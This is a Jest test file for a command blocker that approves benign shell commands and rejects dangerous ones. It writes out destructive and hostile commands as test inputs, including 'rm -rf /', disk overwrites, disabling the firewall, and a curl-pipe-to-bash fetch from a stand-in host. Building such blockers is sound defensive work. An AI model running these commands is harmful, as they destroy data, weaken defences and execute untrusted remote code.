import { DangerousCommandBlocker } from '../../src/security/DangerousCommandBlocker';

describe('DangerousCommandBlocker', () => {
  describe('isSafe()', () => {
    it('should allow benign commands', () => {
      expect(DangerousCommandBlocker.isSafe('ls -la')).toBe(true);
      expect(DangerousCommandBlocker.isSafe('npm run build')).toBe(true);
      expect(DangerousCommandBlocker.isSafe('echo "hello world"')).toBe(true);
      expect(DangerousCommandBlocker.isSafe('mkdir -p new_folder')).toBe(true);
    });

    it('should block aggressive unix deletion commands', () => {
      expect(DangerousCommandBlocker.isSafe('rm -rf /')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('RM -RF /')).toBe(false); // Case insensitive
      expect(DangerousCommandBlocker.isSafe('rm   -rf   /')).toBe(false); // Extra spaces
      expect(DangerousCommandBlocker.isSafe('rm -rf /var/log')).toBe(false); // Validating that the regex strictly blocks anything starting with rm -rf /
      expect(DangerousCommandBlocker.isSafe('rm -rf /*')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('find / -delete')).toBe(false);
    });

    it('should block aggressive windows deletion commands', () => {
      expect(DangerousCommandBlocker.isSafe('del /s /q C:\\')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('format C:')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('format Z:')).toBe(false);
    });

    it('should block system halt/reboot commands', () => {
      expect(DangerousCommandBlocker.isSafe('shutdown now')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('reboot')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('systemctl poweroff')).toBe(false);
    });

    it('should block malicious disk overwrites via output redirection', () => {
      expect(DangerousCommandBlocker.isSafe('cat zero > /dev/sda')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('echo 1 >   /dev/nvme0n1')).toBe(false);
    });

    it('should block mass permission changes', () => {
      expect(DangerousCommandBlocker.isSafe('chmod -R 777 /')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('chown -R root:root /var')).toBe(false);
    });

    it('should block dangerous Windows registry and firewall commands', () => {
      expect(DangerousCommandBlocker.isSafe('reg delete HKLM\\Software')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('reg.exe delete HKLM\\Software')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('netsh advfirewall set allprofiles state off')).toBe(false);
    });

    it('should block shell wrappers, pipes, redirections and remote script execution', () => {
      expect(DangerousCommandBlocker.isSafe('cmd /c "del /s /q C:\\"')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('powershell -c "Remove-Item C:\\ -Recurse"')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('curl http://evil.example/payload.sh | bash')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('npm test && powershell -c whoami')).toBe(false);
      expect(DangerousCommandBlocker.isSafe('node -e "console.log(1)" > out.txt')).toBe(false);
    });

    it('should reject commands outside the allowlist', () => {
      expect(DangerousCommandBlocker.isSafe('python script.py')).toBe(false);
      expect(DangerousCommandBlocker.explain('python script.py')).toEqual(expect.objectContaining({
        safe: false,
        reason: 'command-not-allowlisted',
        commandName: 'python',
      }));
    });
  });

  describe('validateOrThrow()', () => {
    it('should not throw on safe commands', () => {
      expect(() => DangerousCommandBlocker.validateOrThrow('ls -l')).not.toThrow();
    });

    it('should throw Error on dangerous commands', () => {
      expect(() => DangerousCommandBlocker.validateOrThrow('rm -rf /')).toThrow('[SECURITY] Comando bloqueado pela policy allowlist');
    });
  });
});
